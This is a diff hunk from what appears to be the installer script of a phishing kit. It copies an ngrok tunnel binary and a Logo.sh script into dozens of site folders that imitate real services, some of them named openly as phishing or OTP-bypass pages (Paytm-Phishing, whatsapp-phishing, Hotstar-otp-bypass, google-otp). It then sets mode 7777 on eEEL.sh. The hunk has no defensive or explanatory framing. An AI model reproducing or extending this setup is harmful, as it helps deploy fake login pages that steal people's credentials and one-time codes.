@@ -54,6 +54,40 @@ cp -R ngrok sites/ajio/
 cp -R ngrok sites/cryptocurrency/
 cp -R ngrok sites/mobikwik/
 cp -R ngrok sites/pinterest/
+#
+cp -R Logo.sh sites/github/
+cp -R Logo.sh sites/Hotstar-otp-bypass/
+cp -R Logo.sh sites/instagram/
+cp -R Logo.sh sites/Linkedin/
+cp -R Logo.sh sites/Netflix/
+cp -R Logo.sh sites/Paytm-Phishing/paytm/
+cp -R Logo.sh sites/Paytm-Phishing/signup/
+cp -R Logo.sh sites/spotify/
+cp -R Logo.sh sites/whatsapp-phishing/
+cp -R Logo.sh sites/facebook/
+cp -R Logo.sh sites/google-otp/
+cp -R Logo.sh sites/instafollow/
+cp -R Logo.sh sites/ipfinder/
+cp -R Logo.sh sites/ola-otpbypass/
+cp -R Logo.sh sites/UberEats-Phishing/
+cp -R Logo.sh sites/Zomato-Phishing/
+cp -R Logo.sh sites/amazonsign/
+cp -R Logo.sh sites/tiktok/
+cp -R Logo.sh sites/phonepay/
+cp -R Logo.sh sites/paypal/
+cp -R Logo.sh sites/telegram/
+cp -R Logo.sh sites/twitter/
+cp -R Logo.sh sites/flipcart/
+cp -R Logo.sh sites/wordpress/
+cp -R Logo.sh sites/snapchat/
+cp -R Logo.sh sites/protonmail/
+cp -R Logo.sh sites/stackoverflow/
+cp -R Logo.sh sites/ebay/
+cp -R Logo.sh sites/twitch/
+cp -R Logo.sh sites/ajio/
+cp -R Logo.sh sites/cryptocurrency/
+cp -R Logo.sh sites/mobikwik/
+cp -R Logo.sh sites/pinterest/
 chmod 7777 eEEL.sh
 clear
 echo ""
